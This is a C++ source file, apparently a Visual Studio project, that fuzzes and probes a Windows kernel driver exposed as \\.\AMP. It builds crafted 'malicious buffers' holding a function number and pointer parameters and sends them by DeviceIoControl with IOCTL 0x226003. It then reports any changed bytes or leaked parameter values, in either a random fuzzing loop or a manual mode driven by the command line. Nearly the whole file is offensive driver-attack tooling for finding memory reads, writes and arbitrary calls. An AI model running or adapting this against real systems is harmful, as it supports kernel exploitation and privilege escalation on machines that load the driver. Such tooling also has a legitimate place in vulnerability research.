// Author: Brandon Marshall
//

#include <iostream>
#include <Windows.h>

#include <stdio.h>
#pragma warning(disable:4996)

typedef struct savedValuesStruct {
    void* buffer;
    int functionNumber;
    void* unkownPtr;
    ULONGLONG param1;
    ULONGLONG param2;
    ULONGLONG param3;
    ULONGLONG param4;
    ULONGLONG unknownParam;
    ULONGLONG paramValueOf1;
    ULONGLONG paramValueOf2;
    ULONGLONG paramValueOf3;
    ULONGLONG paramValueOf4;

}savedValues, * pSavedValues;
HANDLE getDeviceHanlde(char* name) {
    DWORD generic_read = 0x80000000;
    DWORD generic_write = 0x40000000;
    HANDLE handle = CreateFileA((LPCSTR)name, GENERIC_READ | generic_write, NULL, NULL, 0x3, NULL, NULL);
    return handle;
}

pSavedValues createMaliciousBufferFuzzer(int argc, char* args[], SIZE_T size) {
    savedValues* savedValue = (savedValues*)malloc(sizeof(savedValues));
    byte* maliciousBuffer = (byte*)malloc(size);
    for (int i = 0x0; i < size; i += 0x8)
    {
        *(ULONGLONG*)(maliciousBuffer + i) = (ULONGLONG)(0x0);
    }
    unsigned int functionNum = 0;
    unsigned int param1 = -1;
    unsigned int param2 = -1;
    if (argc >= 3) {
        functionNum = atoi(args[2]);
        if (argc >= 4) {
            param1 = atoi(args[3]);
        }
        if (argc >= 5) {
            param2 = atoi(args[4]);
        }
    }
    else {
        functionNum = rand() % 9;
    }
    *(ULONGLONG*)maliciousBuffer = (ULONGLONG)functionNum;   // 0x0   funciton pointer
    *(ULONGLONG*)(maliciousBuffer + 0x8) = (ULONGLONG)(maliciousBuffer + 0x20); //(maliciousBuffer);   pointer to parameters
    *(ULONGLONG*)(maliciousBuffer + 0x10) = (ULONGLONG)(maliciousBuffer + 0x10); //(maliciousBuffer + 0x20);// (0x1);  pointer to write return value
    *(ULONGLONG*)(maliciousBuffer + 0x18) = (ULONGLONG)(maliciousBuffer + 0x40); //(maliciousBuffer + 0x28);//(0x2); unknownPtr 
    if (param1 != -1) {
        *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)param1;
    }
    else if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)(maliciousBuffer + 0x48); //(maliciousBuffer + 0x30);// (0x3); param 1
    }
    else {
        unsigned int randomint = rand() % 0x30;
        *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)randomint; 
    }
    if (param2 != -1) {
        *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)param2;
    }
    else if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)(maliciousBuffer + 0x50); //(maliciousBuffer + 0x30);// (0x3); param 2
    }
    else {
        unsigned int randomint = rand() % 0x30;
        *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)randomint; 
    }
    if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)(maliciousBuffer + 0x58); //(maliciousBuffer + 0x30);// (0x3); param 3
    }
    else {
        unsigned int randomint = rand() % 0x30;
        *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)randomint; 
    }
    if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)(maliciousBuffer + 0x60); //(maliciousBuffer + 0x30);// (0x3); param 4
    }
    else {
        unsigned int randomint = rand() % 0x30;
        *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)randomint; 
    }

    if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)(maliciousBuffer + 0x40); //(maliciousBuffer + 0x30);// (0x3); unknownParam
    }
    else {
        unsigned int randomint = rand() % 0x1e;
        *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)randomint;
    }

    if ((rand() % 2) == 199) {
        *(ULONGLONG*)(maliciousBuffer + 0x48) = (ULONGLONG)(maliciousBuffer + 0x48); //(maliciousBuffer + 0x30);// (0x3); param 1
    }
    else {
        unsigned int randomint = rand() % 0x1e;
        *(ULONGLONG*)(maliciousBuffer + 0x48) = (ULONGLONG)randomint;
    }
    if ((rand() % 2) == 199) {
        *(ULONGLONG*)(maliciousBuffer + 0x50) = (ULONGLONG)(maliciousBuffer + 0x50); //(maliciousBuffer + 0x30);// (0x3); param 2
    }
    else {
        unsigned int randomint = rand() % 0x3;
        *(ULONGLONG*)(maliciousBuffer + 0x50) = (ULONGLONG)randomint;
    }
    if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x58) = (ULONGLONG)(maliciousBuffer + 0x58); //(maliciousBuffer + 0x30);// (0x3); param 3
    }
    else {
        unsigned int randomint = rand() % 0x30;
        *(ULONGLONG*)(maliciousBuffer + 0x58) = (ULONGLONG)randomint;
    }
    if ((rand() % 2) == 1) {
        *(ULONGLONG*)(maliciousBuffer + 0x60) = (ULONGLONG)(maliciousBuffer + 0x60); //(maliciousBuffer + 0x30);// (0x3); param 4
    }
    else {
        unsigned int randomint = rand() % 0x30;
        *(ULONGLONG*)(maliciousBuffer + 0x60) = (ULONGLONG)randomint;
    }

    /*
    *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)(maliciousBuffer + 0x48);
    *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)(maliciousBuffer + 0x50); // param2
    *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)(maliciousBuffer + 0x58); // param3
    *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)(maliciousBuffer + 0x60);  // param4
    *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)(0x7);*/
    /*
    for (int i = 0x48; i < size; i += 0x8)
    {
        *(ULONGLONG*)(maliciousBuffer + i) = (ULONGLONG)(0x0);
    }*/
    savedValue->buffer = maliciousBuffer;
    savedValue->functionNumber = functionNum;
    savedValue->unkownPtr = (ULONGLONG*)(maliciousBuffer + 0x18);
    savedValue->param1 = *(ULONGLONG*)(maliciousBuffer + 0x20);
    savedValue->param2 = *(ULONGLONG*)(maliciousBuffer + 0x28);
    savedValue->param3 = *(ULONGLONG*)(maliciousBuffer + 0x30);
    savedValue->param4 = *(ULONGLONG*)(maliciousBuffer + 0x38);
    savedValue->unknownParam = *(ULONGLONG*)(maliciousBuffer + 0x18);
    savedValue->paramValueOf1 = *(ULONGLONG*)(maliciousBuffer + 0x48);
    savedValue->paramValueOf2 = *(ULONGLONG*)(maliciousBuffer + 0x50);
    savedValue->paramValueOf3 = *(ULONGLONG*)(maliciousBuffer + 0x58);
    savedValue->paramValueOf4 = *(ULONGLONG*)(maliciousBuffer + 0x60);
    return savedValue;

}

pSavedValues createMaliciousBuffer(int argc, char* args[], SIZE_T size) {
    savedValues* savedValue = (savedValues*)malloc(sizeof(savedValues));
    byte* maliciousBuffer = (byte*)malloc(size);
    
    for (int i = 0x0; i < size; i += 0x8)
    {
        *(ULONGLONG*)(maliciousBuffer + i) = (ULONGLONG)(0x0);
    }
    
    unsigned int functionNum = 0;
    unsigned int param1 = -1;
    unsigned int param2 = -1;
    ULONGLONG param4Dereferened = -1;
    if (argc >= 2) {
        functionNum = atoi(args[1]);
        if (argc >= 3) {
            param1 = atoi(args[2]);
        }
        if (argc >= 4) {
            param2 = atoi(args[3]);
        }
        if (argc >= 5) {
            param4Dereferened = atoi(args[4]);
        }
    }
    *(ULONGLONG*)maliciousBuffer = (ULONGLONG)functionNum;   // 0x0   funciton pointer
    *(ULONGLONG*)(maliciousBuffer + 0x8) = (ULONGLONG)(maliciousBuffer + 0x20); //(maliciousBuffer);   pointer to parameters
    *(ULONGLONG*)(maliciousBuffer + 0x10) = (ULONGLONG)(maliciousBuffer + 0x10); //(maliciousBuffer + 0x20);// (0x1);  pointer to write return value
    *(ULONGLONG*)(maliciousBuffer + 0x18) = (ULONGLONG)(maliciousBuffer + 0x40); //(maliciousBuffer + 0x28);//(0x2);
    if (param1 != -1) {
        *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)param1;
    }
    else {
        *(ULONGLONG*)(maliciousBuffer + 0x20) = (ULONGLONG)(maliciousBuffer + 0x48); // param1
    }
    if (param2 != -1) {
        *(ULONGLONG*)(maliciousBuffer + 0x28) = param2; // param2
    } else {
        *(ULONGLONG*)(maliciousBuffer + 0x28) = (ULONGLONG)(maliciousBuffer + 0x50); // param2
    }
    *(ULONGLONG*)(maliciousBuffer + 0x30) = (ULONGLONG)(maliciousBuffer + 0x58); // param3
    *(ULONGLONG*)(maliciousBuffer + 0x38) = (ULONGLONG)(maliciousBuffer + 0x60);  // param4
    *(ULONGLONG*)(maliciousBuffer + 0x40) = (ULONGLONG)(maliciousBuffer + 0x40);
    *(ULONGLONG*)(maliciousBuffer + 0x48) = (ULONGLONG)(maliciousBuffer + 0x48); // param1
    *(ULONGLONG*)(maliciousBuffer + 0x50) = (ULONGLONG)(maliciousBuffer + 0x50); // param2
    *(ULONGLONG*)(maliciousBuffer + 0x58) = (ULONGLONG)(maliciousBuffer + 0x58); // param3
    *(ULONGLONG*)(maliciousBuffer + 0x60) = param4Dereferened; //(ULONGLONG)(maliciousBuffer + 0x60);  // param4
    
    savedValue->buffer = maliciousBuffer;
    savedValue->functionNumber = 0;
    savedValue->unkownPtr = (ULONGLONG*)(maliciousBuffer + 0x18);
    savedValue->param1 = *(ULONGLONG*)(maliciousBuffer + 0x20);
    savedValue->param2 = *(ULONGLONG*)(maliciousBuffer + 0x28);
    savedValue->param3 = *(ULONGLONG*)(maliciousBuffer + 0x30);
    savedValue->param4 = *(ULONGLONG*)(maliciousBuffer + 0x38);
    savedValue->unknownParam = *(ULONGLONG*)(maliciousBuffer + 0x40);
    savedValue->paramValueOf1 = *(ULONGLONG*)(maliciousBuffer + 0x48);
    savedValue->paramValueOf2 = *(ULONGLONG*)(maliciousBuffer + 0x50);
    savedValue->paramValueOf3 = *(ULONGLONG*)(maliciousBuffer + 0x58);
    savedValue->paramValueOf4 = *(ULONGLONG*)(maliciousBuffer + 0x60);
    return savedValue;

}
void callDeviceIoControl(HANDLE deviceHandle, void* inputBuffer, DWORD inputBufferSize) {
    DWORD bytesReturned; 
    NTSTATUS  status = DeviceIoControl(deviceHandle, 0x226003, inputBuffer, inputBufferSize, NULL, NULL, (LPDWORD)&bytesReturned, (LPOVERLAPPED)NULL);
   
    //printf("%x\n",status);


}

BOOLEAN determineIfBytesChanged(BYTE* trueBuffer,BYTE* maliciousBuffer,SIZE_T size) {
    BOOLEAN returnval = FALSE;
    for (unsigned int i = 0; i < size; i++) {
        if (trueBuffer[i] != maliciousBuffer[i]) {
            if (i != 16 && i != 17 && i != 18 && i != 19 && i != 20 && i != 21) {
                printf("Bytes changed %i : old: %x new: %x \n", i, trueBuffer[i], maliciousBuffer[i]);
                returnval = TRUE;
            }
            if (i == 16) {
                if (*(ULONGLONG*)(maliciousBuffer + 0x10) != 0xfffffffe &&
                    *(ULONGLONG*)(maliciousBuffer + 0x10) != 0xc0000005 &&
                    *(ULONGLONG*)(maliciousBuffer + 0x10) != 0x0) {
                    printf("return val %llx \n", *(ULONGLONG*)(maliciousBuffer + 0x10));
                }
            }
        }
    }
    return returnval;
}

BOOLEAN determineIfWeCanReadParams(BYTE* trueBuffer, BYTE* maliciousBuffer, SIZE_T size) {
    BOOLEAN returnval = FALSE;
    
    if (*(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x48) ||
        *(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x50) ||
        *(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x58) ||
        *(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x60)) {
        if (*(ULONGLONG*)(maliciousBuffer + 0x10) != 0) {
            printf("We Leaked a parameter2! %llx\n", *(ULONGLONG*)(maliciousBuffer + 0x10));
            returnval = true;
        }
    }

    return returnval;
}

BOOLEAN determineIfWeCanReadParams2(BYTE* trueBuffer, BYTE* maliciousBuffer, SIZE_T size) {
    BOOLEAN returnval = FALSE;

    if (*(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x20) ||
        *(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x28) ||
        *(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x30) ||
        *(ULONGLONG*)(maliciousBuffer + 0x10) == *(ULONGLONG*)(maliciousBuffer + 0x38)) {
        if (*(ULONGLONG*)(maliciousBuffer + 0x10) != 0) {
            printf("We Leaked a parameter1 (one im interested in)! %llx\n", *(ULONGLONG*)(maliciousBuffer + 0x10));
            returnval = true;
        }
    }

    return returnval;
}

int main(int argc, char* argv[])
{

    HANDLE deviceHandle = getDeviceHanlde((char*)"\\\\.\\AMP");

    //printf("%x\n", deviceHandle);
    SIZE_T size = 0x300;

    if (strcmp(argv[1], "fuzzing") == 0) {
        while (true) {
            pSavedValues savedValues = createMaliciousBufferFuzzer(argc, argv, size);
            void* trueBufferCopy = (byte*)malloc(size);
            memcpy(trueBufferCopy, savedValues->buffer, size);
            while (true) {
                callDeviceIoControl(deviceHandle, savedValues->buffer, size);
                BOOLEAN parameterReturn = determineIfWeCanReadParams((BYTE*)trueBufferCopy, (BYTE*)savedValues->buffer, size);
                BOOLEAN changeDetected = determineIfBytesChanged((BYTE*)trueBufferCopy, (BYTE*)savedValues->buffer, size);
                BOOLEAN changeDetected2 = determineIfWeCanReadParams2((BYTE*)trueBufferCopy, (BYTE*)savedValues->buffer, size);
                if (changeDetected || parameterReturn || changeDetected2) {
                    printf("function called: %i\n", savedValues->functionNumber);
                    printf("buffer: %p\n", savedValues->buffer);
                    printf("param1: %llx\n", savedValues->param1);
                    printf("param2: %llx\n", savedValues->param2);
                    printf("param3: %llx\n", savedValues->param3);
                    printf("param4: %llx\n", savedValues->param4);
                    printf("param1: %llx\n", savedValues->paramValueOf1);
                    printf("param2: %llx\n", savedValues->paramValueOf2);
                    printf("param3: %llx\n", savedValues->paramValueOf3);
                    printf("param4: %llx\n", savedValues->paramValueOf4);
                    char input[5];
                    scanf("%s", input);
                    if (strcmp(input,"r") == 0) {
                        printf("retrying...");
                        memcpy(savedValues->buffer, trueBufferCopy, size);
                    }
                    else {
                        break;
                    }
                }
                else {
                    break;
                }
            }
            free(savedValues->buffer);
            free(trueBufferCopy);
            free(savedValues);
        }
    }
    else {

        printf("ALT\n");
        pSavedValues savedValues = createMaliciousBuffer(argc,argv, size);
        void* trueBufferCopy = (byte*)malloc(size);
        memcpy(trueBufferCopy, savedValues->buffer, size);
        printf("function called: %i\n", savedValues->functionNumber);
        printf("buffer: %p\n", savedValues->buffer);
        printf("param1: %llx\n", savedValues->param1);
        printf("param2: %llx\n", savedValues->param2);
        printf("param3: %llx\n", savedValues->param3);
        printf("param4: %llx\n", savedValues->param4);
        printf("param1: %llx\n", savedValues->paramValueOf1);
        printf("param2: %llx\n", savedValues->paramValueOf2);
        printf("param3: %llx\n", savedValues->paramValueOf3);
        printf("param4: %llx\n", savedValues->paramValueOf4);
        
        callDeviceIoControl(deviceHandle, savedValues->buffer, size);
        BOOLEAN parameterReturn = determineIfWeCanReadParams((BYTE*)trueBufferCopy, (BYTE*)savedValues->buffer, size);
        BOOLEAN changeDetected = determineIfBytesChanged((BYTE*)trueBufferCopy, (BYTE*)savedValues->buffer, size);
        BOOLEAN changeDetected2 = determineIfWeCanReadParams2((BYTE*)trueBufferCopy, (BYTE*)savedValues->buffer, size);
        if (changeDetected || parameterReturn || changeDetected2) {
            printf("================================================================\n");
            printf("function called: %i\n", savedValues->functionNumber);
            printf("buffer: %p\n", savedValues->buffer);
            printf("param1: %llx\n", savedValues->param1);
            printf("param2: %llx\n", savedValues->param2);
            printf("param3: %llx\n", savedValues->param3);
            printf("param4: %llx\n", savedValues->param4);
            printf("param1: %llx\n", savedValues->paramValueOf1);
            printf("param2: %llx\n", savedValues->paramValueOf2);
            printf("param3: %llx\n", savedValues->paramValueOf3);
            printf("param4: %llx\n", savedValues->paramValueOf4);
            getchar();
        }
    }




}


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
